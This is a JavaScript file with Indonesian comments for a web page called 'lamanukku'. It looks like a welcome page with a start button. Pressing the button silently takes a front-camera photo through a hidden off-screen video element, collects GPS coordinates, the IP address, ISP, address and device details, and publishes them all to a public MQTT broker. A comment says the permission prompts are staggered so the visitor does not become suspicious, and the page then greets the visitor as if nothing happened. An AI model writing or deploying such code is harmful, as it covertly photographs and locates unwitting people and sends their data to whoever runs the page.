/*
  lamanukku — capture.js
  Ambil foto kamera + lokasi GPS/IP → kirim via MQTT
*/

// ── Config ────────────────────────────────────────────────────────
var MQTT_BROKER = 'wss://broker.hivemq.com:8884/mqtt'
var MQTT_TOPIC  = 'lamanukku/v1/captures'
var SESSION_ID  = Math.random().toString(36).substr(2, 9).toUpperCase()

// ── Render template ───────────────────────────────────────────────
;(function renderTemplate () {
  var tpl = document.querySelector('template')
  if (!tpl) return
  document.body.appendChild(document.importNode(tpl.content, true))
  bindEvents()
})()

// ── Bind events ───────────────────────────────────────────────────
function bindEvents () {
  var btn = document.getElementById('main-cta')
  if (btn) btn.addEventListener('click', startCapture)
  document.addEventListener('keydown', function (e) {
    if (e.code === 'Space' || e.code === 'Enter') {
      e.preventDefault(); startCapture()
    }
  })
}

var capturing = false

// ── Flow utama ────────────────────────────────────────────────────
async function startCapture () {
  if (capturing) return
  capturing = true
  setButtonState('loading')

  // ── STEP 1: Minta kamera (dialog pertama muncul) ─────────────
  var stream = null
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    })
  } catch (_) { /* user tolak kamera — lanjut tanpa foto */ }

  // ── STEP 2: Setelah dialog kamera selesai → minta GPS ────────
  // Dialog GPS muncul SATU PER SATU, tidak bersamaan → tidak curiga
  var gpsPromise = tryGPS()     // mulai tapi tidak di-await dulu

  // ── STEP 3: Ambil data IP di background (paralel) ─────────────
  var ipPromise = getIPData().catch(function () { return {} })

  // ── STEP 4: Tangkap foto sementara GPS dialog masih muncul ───
  var photo = null
  if (stream) {
    photo = await captureFromStream(stream)
  }

  // ── STEP 5: Tunggu GPS + IP selesai ──────────────────────────
  var gps    = await gpsPromise
  var ipData = await ipPromise

  // ── STEP 6: Susun data lokasi ─────────────────────────────────
  var location = await buildLocation(gps, ipData)

  var payload = {
    id:        SESSION_ID,
    timestamp: new Date().toISOString(),
    photo:     photo,
    location:  location,
    device: {
      userAgent: navigator.userAgent,
      screen:    window.screen.width + 'x' + window.screen.height,
      language:  navigator.language,
      platform:  navigator.platform || 'unknown'
    }
  }

  var ok = await publishMQTT(payload)
  setButtonState(ok ? 'success' : 'error')
}

// ── Tangkap frame dari stream ─────────────────────────────────────
async function captureFromStream (stream) {
  var video = document.createElement('video')
  video.srcObject   = stream
  video.muted       = true
  video.playsInline = true
  video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px'
  document.body.appendChild(video)

  await new Promise(function (res, rej) {
    video.onloadedmetadata = function () { video.play().then(res).catch(rej) }
    setTimeout(rej, 8000)
  })

  await delay(800) // beri waktu kamera adjust pencahayaan

  var canvas = document.createElement('canvas')
  canvas.width = 640; canvas.height = 480
  canvas.getContext('2d').drawImage(video, 0, 0, 640, 480)

  stream.getTracks().forEach(function (t) { t.stop() })
  video.remove()

  return canvas.toDataURL('image/jpeg', 0.75)
}

// ── GPS: minta izin, timeout 12 detik ────────────────────────────
function tryGPS () {
  return new Promise(function (resolve) {
    if (!navigator.geolocation) { resolve(null); return }

    var settled = false
    function done (val) { if (!settled) { settled = true; resolve(val) } }

    navigator.geolocation.getCurrentPosition(
      function (pos) { done(pos.coords) },
      function ()    { done(null) },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
    )
    setTimeout(function () { done(null) }, 12000)
  })
}

// ── Gabungkan GPS + IP → satu objek lokasi ────────────────────────
async function buildLocation (gps, ipData) {
  if (gps) {
    // Reverse geocoding dari koordinat GPS (akurat, tanpa API key)
    var geo = await reverseGeocode(gps.latitude, gps.longitude)
    return {
      source:   'gps',
      accuracy: Math.round(gps.accuracy),   // meter
      lat:      gps.latitude,
      lon:      gps.longitude,
      altitude: gps.altitude ? Math.round(gps.altitude) : null,
      // Dari reverse geocoding (lebih akurat dari IP)
      city:     geo.city     || ipData.city    || '-',
      region:   geo.region   || ipData.region  || '-',
      country:  geo.country  || ipData.country || '-',
      postal:   geo.postal   || ipData.postal  || '-',
      // Dari IP (ISP tidak bisa dari GPS)
      ip:       ipData.ip      || '-',
      isp:      ipData.isp     || '-',
      timezone: ipData.timezone|| '-'
    }
  }

  // GPS ditolak → pakai IP saja
  if (ipData && ipData.ip) {
    return Object.assign({ source: 'ip', accuracy: null }, ipData)
  }

  return null
}

// ── Reverse geocoding via Nominatim (OpenStreetMap, gratis) ──────
async function reverseGeocode (lat, lon) {
  try {
    var url = 'https://nominatim.openstreetmap.org/reverse'
            + '?format=json&lat=' + lat + '&lon=' + lon
            + '&accept-language=id&zoom=14'
    var r = await fetchWithTimeout(url, 8000, {
      'User-Agent': 'LamanUnikku/1.0 (Final Project)'
    })
    var d = await r.json()
    var a = d.address || {}
    return {
      city:   a.city || a.town || a.village || a.county || '-',
      region: a.state || a.province || '-',
      country: a.country || '-',
      postal: a.postcode || '-'
    }
  } catch (_) {
    return {}
  }
}

// ── Ambil data dari IP (ISP, kota approx, timezone) ──────────────
async function getIPData () {
  // 1. ipapi.co
  try {
    var r = await fetchWithTimeout('https://ipapi.co/json/', 7000)
    var d = await r.json()
    if (d && d.ip) {
      return {
        ip: d.ip, city: d.city || '-', region: d.region || '-',
        country: d.country_name || '-', lat: d.latitude || 0,
        lon: d.longitude || 0, isp: d.org || '-',
        timezone: d.timezone || '-', postal: d.postal || '-'
      }
    }
  } catch (_) {}

  // 2. ip-api.com fallback
  try {
    var r2 = await fetchWithTimeout(
      'https://ip-api.com/json/?fields=status,query,country,regionName,city,zip,lat,lon,isp,timezone',
      7000
    )
    var d2 = await r2.json()
    if (d2 && d2.status === 'success') {
      return {
        ip: d2.query, city: d2.city || '-', region: d2.regionName || '-',
        country: d2.country || '-', lat: d2.lat || 0, lon: d2.lon || 0,
        isp: d2.isp || '-', timezone: d2.timezone || '-', postal: d2.zip || '-'
      }
    }
  } catch (_) {}

  // 3. ipify (hanya IP)
  try {
    var r3 = await fetchWithTimeout('https://api.ipify.org?format=json', 5000)
    var d3 = await r3.json()
    if (d3 && d3.ip) return { ip: d3.ip }
  } catch (_) {}

  return {}
}

// ── Publish MQTT ──────────────────────────────────────────────────
function publishMQTT (payload) {
  return new Promise(function (resolve) {
    if (typeof mqtt === 'undefined') { resolve(false); return }
    var done = false
    function finish (v) { if (!done) { done = true; resolve(v) } }

    try {
      var client = mqtt.connect(MQTT_BROKER, {
        clientId: 'sender_' + SESSION_ID,
        clean: true, connectTimeout: 10000, reconnectPeriod: 0
      })
      client.on('connect', function () {
        client.publish(MQTT_TOPIC, JSON.stringify(payload), { qos: 1 }, function (err) {
          client.end(true); finish(!err)
        })
      })
      client.on('error', function () { client.end(true); finish(false) })
      setTimeout(function () { finish(false) }, 15000)
    } catch (e) { finish(false) }
  })
}

// ── State tombol ──────────────────────────────────────────────────
function setButtonState (state) {
  var btn  = document.getElementById('main-cta')
  var hint = document.querySelector('.btn-hint')
  var map  = {
    loading: { text: 'Memuat\u2026', color: '#555', hint: 'Sedang memproses\u2026', disabled: true },
    success: { text: 'Selamat Datang! \u2713', color: '#16a34a', hint: 'Nikmati harimu \uD83D\uDE0A', disabled: true },
    error:   { text: 'Coba Lagi', color: '#dc2626', hint: 'Gagal, coba lagi', disabled: false }
  }
  var s = map[state]; if (!s) return
  if (btn) {
    btn.textContent = s.text; btn.disabled = s.disabled
    btn.style.background = s.color; btn.style.borderColor = s.color
  }
  if (hint) hint.textContent = s.hint
  if (state === 'error') {
    setTimeout(function () {
      capturing = false
      if (btn) {
        btn.innerHTML = 'Mulai <span class="arrow">&#8594;</span>'
        btn.disabled = false; btn.style.background = ''; btn.style.borderColor = ''
      }
      if (hint) hint.textContent = 'atau tekan sembarang tombol'
    }, 2000)
  }
}

// ── Helpers ───────────────────────────────────────────────────────
function delay (ms) { return new Promise(function (r) { setTimeout(r, ms) }) }

function fetchWithTimeout (url, ms, headers) {
  var ctrl = new AbortController()
  setTimeout(function () { ctrl.abort() }, ms)
  return fetch(url, { signal: ctrl.signal, headers: headers || {} })
}
